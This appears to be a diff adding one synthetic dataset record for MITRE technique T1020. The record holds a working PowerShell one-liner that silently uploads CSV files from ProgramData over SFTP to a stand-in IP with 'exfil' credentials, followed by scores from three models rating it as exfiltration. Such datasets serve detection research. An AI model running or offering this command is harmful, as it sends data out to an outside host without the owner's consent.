@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "[Reflection.Assembly]::LoadFile('C:\\Program Files (x86)\\WinSCP\\WinSCPnet.dll') | Out-Null; $so=New-Object WinSCP.SessionOptions -Property @{ Protocol=[WinSCP.Protocol]::Sftp; HostName='192.0.2.10'; UserName='exfil'; Password='S3cr3t!'; SshHostKeyFingerprint='ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }; $s=New-Object WinSCP.Session; $s.Open($so); $to=New-Object WinSCP.TransferOptions; $to.ResumeSupport.State=[WinSCP.TransferResumeSupportState]::On; $s.PutFiles('C:\\ProgramData\\*.csv','/data/',$false,$to) | Out-Null; $s.Dispose() 2>$null",
+  "explanation": "Uses the WinSCP .NET assembly from PowerShell to programmatically exfiltrate CSV files over SFTP with resume support and no console output.",
+  "rationale_steps": [
+    "Load WinSCP .NET library into PowerShell",
+    "Create session options with host key pinning",
+    "Open session and configure transfer options",
+    "Upload matching files and dispose session silently"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-8626286d",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell chain has balanced quotes/braces, valid semicolon separators, and correctly references WinSCP .NET types, methods, and properties.",
+        "semantic_score": 4,
+        "semantic_justification": "It programmatically uploads CSVs via SFTP using WinSCP with resume support (matching automated exfiltration), though the test IP/fingerprint and limited error suppression slightly reduce operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:20:01.948434Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct object instantiation syntax, proper method calls, and appropriate error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by loading the WinSCP .NET assembly, establishing an SFTP connection with credentials, and transferring CSV files to a remote server with resume capability and error suppression, aligning perfectly with the T1020 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:20:06.009838Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for .NET reflection, object creation, property assignment, method calls, and output redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of programmatically exfiltrating CSV files over SFTP using the WinSCP .NET assembly, directly aligning with the T1020 Automated Exfiltration technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:02:18.682623Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
